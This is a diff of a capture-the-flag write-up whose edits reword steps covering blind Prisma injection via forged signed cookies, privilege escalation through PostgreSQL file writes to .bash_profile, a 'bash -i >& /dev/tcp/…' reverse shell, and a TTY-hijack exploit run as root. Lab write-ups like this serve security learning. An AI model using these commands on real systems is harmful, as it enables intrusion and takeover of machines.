@@ -325,7 +325,7 @@ Here are the facts so far and my deductions:
 * There's a SQL query that is 100% injectable, but I don't know how to exploit it at this point.
 * The cookie is not validated in any way, it takes my input directly. It checks whether a `true` condition is returned from `findFirst` from the `prisma` API module --> Blind Injection based on where it redirects us?&#x20;
 
-Based on the facts above, there should be a method of which we can brute force the cookie using a smartly created user cookie that is signed through Cookie Monster.&#x20;
+Based on the facts above, there should be a method of which we can brute force the hash using a smartly created user cookie that is signed through Cookie Monster.&#x20;
 
 Since this uses `prisma` client API, we can try to inject some commands from that module based on their nested JSON queries possible.
 
@@ -354,7 +354,7 @@ $ ./cookie-monster.js -e -f ../cookie.json -k 8929874489719802418902487651347865
 [+] Signature Cookie: download_session.sig=v0PDQv1xMVxi-N8hRUHd2B___z4
 ```
 
-Then, using it within the website worked well:
+Using these parameters on the website returned the `/home` directory with response that looks like it works:
 
 <figure><img src="../../.gitbook/assets/image (805).png" alt=""><figcaption></figcaption></figure>
 
@@ -362,7 +362,7 @@ I tried each character until I reached `f`, and it returned something different:
 
 <figure><img src="../../.gitbook/assets/image (806).png" alt=""><figcaption></figcaption></figure>
 
-The length of the first response was `2174`, while the second was different. Based on this, we should have exploited blind injection successfully and automation is possible.
+The length of the first response was `2174`, while the second was different. Based on this, we should have exploited blind injection successfully and automation is possible. Further testing with 2 characters works as well.
 
 Here's my script:
 
@@ -528,9 +528,11 @@ We can first enumerate the privileges we have with `\du`:
  postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
 ```
 
-Interestingly, we are given the `pg_write_server_files` privilege. The database itself does not have any interesting information, so we are supposed to use this privilege to escalate to `postgres`. Since we have an arbitrary write as this user, I thought of creating a `/bin/bash` SUID binary to escalate to it. Being able to write files as the `postgres` user is no good if we cannot execute it as `postgres`.&#x20;
+Interestingly, we are given the `pg_write_server_files` privilege. The database itself does not have any interesting information, so we are supposed to use this privilege to escalate to `postgres`.&#x20;
 
-I noticed that `root` runs `su -l postgres`, meaning that that user is being logged into periodically. This means that files like `.bashrc` and `.profile` are being executed when this command is triggered. Using our file write abilities, we can write in a `chmod u+s /bin/bash` command somewhere.
+Since we have an arbitrary write as this user, I thought of creating a `/bin/bash` SUID binary to escalate to it. Being able to write files as the `postgres` user is no good if we cannot execute it as `postgres`.&#x20;
+
+I noticed that `root` runs `su -l postgres`, meaning that that user is being logged into periodically. This means that files like `.bashrc` and `.profile` are being executed when this command is executed. Using our file write abilities, we can write in some commands to the `.bash_profile` file, which would be executed when `root` logs in as `postgres`.&#x20;
 
 I used this to spawn an SUID shell:
 
@@ -542,7 +544,7 @@ After waiting for a bit, we can move laterally:
 
 <figure><img src="../../.gitbook/assets/image (810).png" alt=""><figcaption></figcaption></figure>
 
-However, we are still technically `wesley`, instead of `postgres` even if the EUID changes. We can replace the command executed with a reverse shell instead:
+However, we are still technically `wesley`instead of `postgres` even if the EUID changes. We can replace the command executed with a reverse shell instead:
 
 ```sql
 COPY (SELECT CAST('bash -i >& /dev/tcp/10.10.14.7/4444 0>&1' AS text)) TO '/var/lib/postgresql/.bash_profile';
@@ -552,7 +554,7 @@ Then on a listener port, we would get a `postgres` shell:
 
 <figure><img src="../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>
 
-However, the shell dies quickly, presumably because the connection cuts out when `root` runs `su` again. At least I know that this works.&#x20;
+However, the shell dies quickly, presumably because the connection cuts out when `root` runs `su -l` again. At least I know that this works.&#x20;
 
 ### TTY Hijack --> Root
 
@@ -570,7 +572,7 @@ I was thinking whether there were ways to hijack this session. Searching for `ro
 
 {% embed url="https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking" %}
 
-I changed the command executed first to test it:
+The website above included a PoC in C. I changed the command executed first to test it:
 
 ```c
 #include <fcntl.h>
@@ -595,7 +597,7 @@ int main() {
 }
 ```
 
-Then, I compiled it using `gcc` and transferred to the machine and then ran `chmod` on it. Afterwards, I ran the same SQL command to execute this compiled exploit:
+Then, I compiled it using `gcc` and transferred to the machine and then ran `chmod` on it. Afterwards, I ran the same SQL command to execute this compiled exploit as `root`:
 
 ```sql
 COPY (SELECT CAST('/tmp/exploit' AS text)) TO '/var/lib/postgresql/.bash_profile';
